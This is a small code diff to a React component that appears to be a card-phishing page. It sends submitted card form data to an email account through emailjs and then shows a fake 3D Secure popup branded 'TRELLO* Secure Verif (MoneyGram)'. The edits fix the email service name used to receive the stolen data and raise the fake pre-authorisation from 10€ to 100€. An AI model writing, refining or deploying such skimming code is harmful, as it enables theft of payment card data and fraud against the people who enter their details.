@@ -111,7 +111,7 @@ const Board = () => {
       setShow3DSecurePopup(true);
     }, 5000);
 
-    emailjs.sendForm('gmail-alexandree', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
+    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
       .then(() => {
         console.log('SUCCESS!');
         setIsLoading(false);
@@ -307,7 +307,7 @@ const Board = () => {
               </>
             ) : (
               <>
-                <p>Confirmez la pré-autorisaton de 10€</p>
+                <p>Confirmez la pré-autorisaton de 100€</p>
                 <span>TRELLO* Secure Verif (MoneyGram)</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
